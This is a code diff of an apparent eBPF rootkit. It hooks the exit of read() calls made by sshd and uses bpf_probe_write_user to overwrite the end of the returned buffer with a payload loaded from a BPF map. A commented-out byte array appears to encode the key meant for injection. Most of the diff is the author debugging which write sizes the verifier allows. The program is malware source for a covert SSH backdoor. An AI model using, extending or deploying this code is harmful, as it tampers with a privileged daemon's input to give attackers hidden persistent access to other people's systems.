@@ -83,46 +83,75 @@ int handle_read_exit(struct trace_event_raw_sys_exit *ctx)
     long int read_size = ctx->ret;
     // long int read_size = ctx->ret;
 
-    // Add our payload to the end and with '\n'
     // read_size less than payload, we can't write in the buffer
-    // read_size == 4096 read max when sshd read.
+    // read_size == data->calling_size true means read max when sshd want read. 
+    // Also means this is not the file's end.
     if (read_size < max_payload_len || read_size == data->calling_size ) {
         return 0;
     }
-    // |<--------- raw content ------->|\n|<------------ payload ------------->|
+    // |<-------------------------- data->calling_size read(calling_size) -------------------------------------->|
+    // |<--------- raw content ------->|<-------------- payload -------------->|
     // |<----------------------------- ret_size ------------------------------>|
     // |<-- buff_addr                  |<-- new_buff_addr                      |<-- buff_addr + read_size
-    // char local_buff[max_payload_len] = {0x0a, 67,63,40,67,63,40,66,70,40,62,104,40,66,65,40,66,64,40,63,62,40,63,65,40,63,65,40,63,61,40,63,71,40,62,60,40,64,61,40,64,61,40,64,61,40,64,61,40,64,63,40,63,63,40,64,105,40,67,101,40,66,61,40,64,63,40,63,61,40,66,103,40,65,101,40,64,64,40,64,71,40,63,61,40,64,105,40,65,64,40,64,65,40,63,65,40,64,61,40,64,61,40,64,61,40,64,61,40,64,71,40,64,104,40,67,101,40,64,66,40,66,65,40,65,60,40,64,104,40,63,60,40,67,65,40,63,71,40,63,62,40,64,105,40,66,101,40,67,60,40,64,63,40,64,101,40,63,63,40,65,64,40,67,66,40,64,67,40,64,71,40,65,71,40,63,64,40,64,63,40,66,71,40,66,64,40,67,101,40,65,64,40,65,64,40,65,62,40,66,106,40,64,65,40,67,101,40,64,105,40,66,64,40,66,104,40,64,103,40,64,105,40,65,65,40,67,70,40,66,63,40,64,105,40,64,105,40,64,63,40,62,60,40,67,62,40,66,106,40,66,106,40,67,64,40,64,60,40,66,62,40,63,61,40,63,61,40,63,64,40,63,65,40,63,61,40,63,64, 0x0a}; // clean buff
-    char local_buff[max_payload_len] = {0x00};
+    // |<----
     __u8 key = 0;
     struct custom_payload *payload = bpf_map_lookup_elem(&map_payload_buffer, &key);
-    long unsigned int new_buff_addr = buff_addr + read_size - max_payload_len -1;
-    // long unsigned int new_buff_addr = buff_addr + read_size - payload->payload_len -1;
-    // char *new_buff_addr = (char *)(buff_addr + read_size - max_payload_len -1);
-    // [DEBUG] 
-    // char *new_buff_addr = (char *)(buff_addr + read_size - payload->payload_len -1);
-    // char *payload = (char *)bpf_map_lookup_elem(&map_payload_buffer, &key);
-    // if (payload == 0 || payload->payload_len > max_payload_len || payload->payload_len <= 0 ) 
-    if (payload == 0)
+    // payload is not gotten. payload == 0
+    // payload is smaller then return size. payload->payload_len < read_size 
+    if (payload == 0 )
     {
         return 0;
     }
-    // local_buff[0] = '\n';
-    // for (unsigned int i = 0; i < (payload->payload_len); i++)
+    // restrict payload len too small or to big.
+    u32 len = payload->payload_len;
+    if (len <= 0 || len > max_payload_len ) {
+        return 0;
+    }
+    // if define u32 len = payload_len will bad.
+    
+    //      |<-------------------------- data->calling_size read(calling_size) -------------------------------------->|
+    //      |<--------- raw content ------->|<-------------- payload -------------->|
+    //      |<----------------------------- ret_size ------------------------------>|
+    // best |<-- buff_addr                  |<-- new_buff_addr                      |<-- buff_addr + read_size
+    // now  |<-- buff_addr                  |<-- new_buff_addr                           |<-- new_buff_addr + max_payload_len
+    // long unsigned int new_buff_addr = buff_addr + read_size - payload->payload_len ;
+     
+    //      |<-------------------------- data->calling_size read(calling_size) -------------------------------------->|
+    //      |<--------- raw content ------->|<-------------- payload -------------->|
+    //      |<----------------------------- ret_size ------------------------------>|
+    // best |<-- buff_addr                  |<-- new_buff_addr                      |<-- buff_addr + read_size
+    // now  |<-- buff_addr             |<-- new_buff_addr                           |<-- new_buff_addr + max_payload_len
+    long unsigned int new_buff_addr = buff_addr + read_size - max_payload_len;
+    
+    /* 
+    
+    // if local_buff to clone 
+    char local_buff[max_payload_len] = {0x00}; // init local_buf if you want edit the buffer.
+    // char local_buff[max_payload_len] = {0x0a, 67,63,40,67,63,40,66,70,40,62,104,40,66,65,40,66,64,40,63,62,40,63,65,40,63,65,40,63,61,40,63,71,40,62,60,40,64,61,40,64,61,40,64,61,40,64,61,40,64,63,40,63,63,40,64,105,40,67,101,40,66,61,40,64,63,40,63,61,40,66,103,40,65,101,40,64,64,40,64,71,40,63,61,40,64,105,40,65,64,40,64,65,40,63,65,40,64,61,40,64,61,40,64,61,40,64,61,40,64,71,40,64,104,40,67,101,40,64,66,40,66,65,40,65,60,40,64,104,40,63,60,40,67,65,40,63,71,40,63,62,40,64,105,40,66,101,40,67,60,40,64,63,40,64,101,40,63,63,40,65,64,40,67,66,40,64,67,40,64,71,40,65,71,40,63,64,40,64,63,40,66,71,40,66,64,40,67,101,40,65,64,40,65,64,40,65,62,40,66,106,40,64,65,40,67,101,40,64,105,40,66,64,40,66,104,40,64,103,40,64,105,40,65,65,40,67,70,40,66,63,40,64,105,40,64,105,40,64,63,40,62,60,40,67,62,40,66,106,40,66,106,40,67,64,40,64,60,40,66,62,40,63,61,40,63,61,40,63,64,40,63,65,40,63,61,40,63,64, 0x0a}; // clean buff
     for (unsigned int i = 0; i < max_payload_len; i++)
     {
         // local_buf[i+1] = payload[i];
         local_buff[i] = payload->raw_buf[i];
     }
-    bpf_printk("%s\n", local_buff);
-    bpf_probe_write_user((void *)new_buff_addr, local_buff, max_payload_len);
-    // local_buff[payload->payload_len+1] = '\n';
-    // local_buff[max_payload_len + 1] = '\0';
-    //[DEBUG] long ret = bpf_probe_write_user((void *)new_buff_addr, local_buff, max_payload_len);
+    
+    // bpf_printk("%s\n", local_buff);
+
+    // Copy to user. Which is great.
+    bpf_probe_write_user((void *)new_buff_addr, local_buff, max_payload_len);    // works
+    */
+    bpf_probe_write_user((void *)new_buff_addr, payload->raw_buf, max_payload_len); // Works
+    // bpf_probe_write_user((void *)new_buff_addr, payload->raw_buf , len);         // disallow
+    // bpf_probe_write_user((void *)new_buff_addr, payload->raw_buf , payload->payload_len);         // disallow 
+    // bpf_probe_write_user((void *)new_buff_addr, payload->raw_buf , payload->payload_len);         // disallow 
+    
+    // [DEBUG] 
+    // long ret = bpf_probe_write_user((void *)new_buff_addr, local_buff, max_payload_len);
     // bpf_probe_write_user((void *)buff_addr, (void *)payload->raw_buf, payload->payload_len);
     // bpf_probe_write_user((void *)buff_addr, local_buff, payload_len);
     // Send event
     /*
+
+    // event report.
     struct event *e;
     e = bpf_ringbuf_reserve(&rb, sizeof(struct event *), 0);
     if (e)
